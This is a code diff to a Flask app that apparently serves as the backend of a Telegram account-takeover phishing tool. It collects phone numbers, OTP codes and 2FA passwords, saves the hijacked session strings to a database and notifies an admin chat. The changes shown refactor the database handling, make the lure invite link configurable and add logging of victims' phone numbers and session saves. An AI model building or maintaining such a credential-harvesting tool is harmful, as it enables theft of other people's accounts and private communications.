@@ -20,7 +20,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
 ADMIN_CHAT_ID = int(raw_admin_chat) if raw_admin_chat.lstrip('-').isdigit() else raw_admin_chat
 
-STATIC_INVITE_LINK = "https://t.me/+bDGHiHUCt_MwOWY9"
+STATIC_INVITE_LINK = os.getenv("STATIC_INVITE_LINK", "https://t.me/+bDGHiHUCt_MwOWY9")
 temp_clients = {}
 
 # ─── SQLITE DATABASE HELPER ───
@@ -34,7 +34,8 @@ def get_db():
     return conn
 
 def init_db():
-    with get_db() as conn:
+    conn = get_db()
+    try:
         conn.execute('''
             CREATE TABLE IF NOT EXISTS active_sessions (
                 phone TEXT PRIMARY KEY,
@@ -44,14 +45,20 @@ def init_db():
             )
         ''')
         conn.commit()
+    finally:
+        conn.close()
 
 def save_active_session(phone, user_id, session_str, msg_id):
-    with get_db() as conn:
+    conn = get_db()
+    try:
         conn.execute('''
             INSERT OR REPLACE INTO active_sessions (phone, user_id, session, msg_id)
             VALUES (?, ?, ?, ?)
         ''', (phone, user_id, session_str, msg_id))
         conn.commit()
+        logger.info(f"💾 Saved session for {phone} with msg_id: {msg_id}")
+    finally:
+        conn.close()
 
 init_db()
 
@@ -151,6 +158,9 @@ async def async_verify_code(phone_number, code, password):
         })
         if res.get("ok"):
             msg_id = res["result"]["message_id"]
+            logger.info(f"📩 Admin message sent successfully. Message ID: {msg_id}")
+        else:
+            logger.error(f"❌ Failed to send admin message: {res}")
 
     save_active_session(phone_number, user_id, session_string, msg_id)
 
@@ -180,6 +190,7 @@ def send_code():
         future.result()
         return jsonify({"success": True, "message": "OTP code sent!"})
     except Exception as err:
+        logger.error(f"Error sending OTP to {phone_number}: {err}")
         return jsonify({"success": False, "error": str(err)}), 500
 
 @app.route('/api/verify-code', methods=['POST'])
@@ -202,6 +213,7 @@ def verify_code():
             return jsonify({"success": False, "requiresPassword": True}), 401
         return jsonify(res)
     except Exception as err:
+        logger.error(f"Error verifying code for {phone_number}: {err}")
         return jsonify({"success": False, "error": str(err)}), 400
 
 if __name__ == '__main__':
